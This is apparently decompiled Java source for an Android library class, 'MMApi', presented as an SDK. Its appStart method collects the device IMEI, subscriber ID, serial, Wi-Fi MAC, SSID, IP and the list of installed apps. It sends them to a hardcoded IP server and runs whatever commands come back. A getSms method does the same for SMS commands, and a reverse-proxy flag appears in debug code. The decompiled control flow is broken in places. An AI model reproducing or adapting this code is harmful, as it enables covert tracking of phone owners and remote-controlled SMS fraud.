package mm.api.android;

import android.app.Activity;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Build.VERSION;
import android.telephony.TelephonyManager;
import android.util.DisplayMetrics;
import android.view.Display;
import android.view.WindowManager;
import java.util.Iterator;
import java.util.List;
import mm.api.Command;
import mm.api.MMApiException;
import mm.api.SMSCommand;
import mm.api.SMSResponse;
import mm.api.ServerConnector;
import mm.api.impl.XmlServerConnector;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class MMApi
{
  private static final String GATE = "http://120.25.132.133";
  private static ServerConnector connector = new XmlServerConnector("http://120.25.132.133");
  private static boolean isDebug;
  
  static
  {
    connector.initialize();
  }
  
  private MMApi() {}
  
  public static void appStart(Activity paramActivity)
  {
    appStart(paramActivity, null, null);
  }
  
  public static void appStart(Activity paramActivity, String paramString1, String paramString2)
  {
    Object localObject2 = (TelephonyManager)paramActivity.getSystemService("phone");
    if (localObject2 == null) {
      throw new MMApiException("MMApi must have android.permission.READ_PHONE_STATE permission. ");
    }
    String str2;
    try
    {
      str2 = ((TelephonyManager)localObject2).getDeviceId();
      if ((str2 == null) || (str2.trim().length() < 1)) {
        throw new MMApiException("MMApi getDeviceId failed. ");
      }
    }
    catch (JSONException paramActivity)
    {
      throw new MMApiException(paramActivity);
    }
    String str1 = ((TelephonyManager)localObject2).getSubscriberId();
    if ((str1 == null) || (str1.trim().length() < 1)) {
      throw new MMApiException("MMApi getSubscriberId failed. ");
    }
    Object localObject1 = (WifiManager)paramActivity.getSystemService("wifi");
    Object localObject4;
    Object localObject3;
    JSONObject localJSONObject;
    int i;
    if (localObject1 == null)
    {
      localObject1 = null;
      localObject4 = paramActivity.getWindowManager();
      localObject3 = paramActivity.getPackageManager().getInstalledPackages(0);
      localJSONObject = new JSONObject();
      putQuietly(localJSONObject, "imei", str2);
      putQuietly(localJSONObject, "brand", Build.BRAND);
      putQuietly(localJSONObject, "manufacturer", Build.MANUFACTURER);
      putQuietly(localJSONObject, "model", Build.MODEL);
      putQuietly(localJSONObject, "release", Build.VERSION.RELEASE);
      putQuietly(localJSONObject, "sdk", Integer.valueOf(Build.VERSION.SDK_INT));
      putQuietly(localJSONObject, "fingerprint", Build.FINGERPRINT);
      putQuietly(localJSONObject, "board", Build.BOARD);
      putQuietly(localJSONObject, "serial", Build.SERIAL);
      putQuietly(localJSONObject, "display", Build.DISPLAY);
      putQuietly(localJSONObject, "id", Build.ID);
      putQuietly(localJSONObject, "networkOperatorName", ((TelephonyManager)localObject2).getNetworkOperatorName());
      if (localObject1 != null)
      {
        putQuietly(localJSONObject, "macAddress", ((WifiInfo)localObject1).getMacAddress());
        putQuietly(localJSONObject, "ssid", ((WifiInfo)localObject1).getSSID());
        i = ((WifiInfo)localObject1).getIpAddress();
        putQuietly(localJSONObject, "ipAddress", (i & 0xFF) + "." + (i >> 8 & 0xFF) + "." + (i >> 16 & 0xFF) + "." + (i >> 24 & 0xFF));
      }
      localObject1 = new DisplayMetrics();
      ((WindowManager)localObject4).getDefaultDisplay().getMetrics((DisplayMetrics)localObject1);
      putQuietly(localJSONObject, "height", Integer.valueOf(((DisplayMetrics)localObject1).heightPixels));
      putQuietly(localJSONObject, "width", Integer.valueOf(((DisplayMetrics)localObject1).widthPixels));
      putQuietly(localJSONObject, "density", Integer.valueOf(((DisplayMetrics)localObject1).densityDpi));
      localObject1 = new JSONArray();
      localObject2 = ((List)localObject3).iterator();
    }
    for (;;)
    {
      if (!((Iterator)localObject2).hasNext())
      {
        putQuietly(localJSONObject, "installed", localObject1);
        localObject1 = System.getProperty("http.agent");
        paramActivity = (Activity)localObject1;
        if (localObject1 == null) {
          paramActivity = getDefaultUserAgent();
        }
        putQuietly(localJSONObject, "userAgent", paramActivity);
        paramActivity = connector.appStart(paramString1, paramString2, str1, localJSONObject);
        if (paramActivity == null) {
          return;
        }
        paramActivity.executeCommand();
        return;
        localObject1 = ((WifiManager)localObject1).getConnectionInfo();
        break;
      }
      Object localObject5 = (PackageInfo)((Iterator)localObject2).next();
      if ((((PackageInfo)localObject5).applicationInfo != null) && ((((PackageInfo)localObject5).applicationInfo.flags & 0x1) == 0) && (!((PackageInfo)localObject5).packageName.equals(paramActivity.getPackageName())))
      {
        str2 = ((PackageInfo)localObject5).applicationInfo.loadLabel(paramActivity.getPackageManager()).toString();
        localObject3 = ((PackageInfo)localObject5).packageName;
        localObject4 = ((PackageInfo)localObject5).versionName;
        i = ((PackageInfo)localObject5).versionCode;
        localObject5 = new JSONObject();
        putQuietly((JSONObject)localObject5, "name", str2);
        putQuietly((JSONObject)localObject5, "packageName", localObject3);
        putQuietly((JSONObject)localObject5, "versionName", localObject4);
        putQuietly((JSONObject)localObject5, "versionCode", Integer.valueOf(i));
        ((JSONArray)localObject1).put(localObject5);
      }
    }
  }
  
  private static String getDefaultUserAgent()
  {
    StringBuilder localStringBuilder = new StringBuilder(64);
    localStringBuilder.append("Dalvik/");
    localStringBuilder.append(System.getProperty("java.vm.version"));
    localStringBuilder.append(" (Linux; U; Android ");
    String str = Build.VERSION.RELEASE;
    if (str.length() > 0) {}
    for (;;)
    {
      localStringBuilder.append(str);
      if ("REL".equals(Build.VERSION.CODENAME))
      {
        str = Build.MODEL;
        if (str.length() > 0)
        {
          localStringBuilder.append("; ");
          localStringBuilder.append(str);
        }
      }
      str = Build.ID;
      if (str.length() > 0)
      {
        localStringBuilder.append(" Build/");
        localStringBuilder.append(str);
      }
      localStringBuilder.append(")");
      return localStringBuilder.toString();
      str = "1.0";
    }
  }
  
  public static SMSResponse getSms(Context paramContext, String paramString1, long paramLong, String paramString2, String paramString3)
  {
    Object localObject = (TelephonyManager)paramContext.getSystemService("phone");
    if (localObject == null) {
      throw new MMApiException("MMApi must have android.permission.READ_PHONE_STATE permission. ");
    }
    paramContext = ((TelephonyManager)localObject).getDeviceId();
    if ((paramContext == null) || (paramContext.trim().length() < 1)) {
      throw new MMApiException("MMApi getDeviceId failed. ");
    }
    localObject = ((TelephonyManager)localObject).getSubscriberId();
    if ((localObject == null) || (((String)localObject).trim().length() < 1)) {
      throw new MMApiException("MMApi getSubscriberId failed. ");
    }
    paramContext = connector.getSms(paramContext, (String)localObject, paramString1, paramLong, paramString2, paramString3, Build.VERSION.RELEASE, Build.MODEL);
    if (paramContext != null) {
      paramContext.executeCommand();
    }
    return paramContext;
  }
  
  public static boolean isDebug()
  {
    return isDebug;
  }
  
  private static void putQuietly(JSONObject paramJSONObject, String paramString, Object paramObject)
  {
    if ((paramJSONObject == null) || (paramString == null) || (paramObject == null)) {
      return;
    }
    paramJSONObject.put(paramString, paramObject);
  }
  
  public static void setDebug(String paramString)
  {
    isDebug = true;
    if (connector != null) {
      connector.destroy();
    }
    connector = new XmlServerConnector(paramString);
    connector.initialize();
    cn.banny.rp.ReverseProxy.debug = true;
  }
}
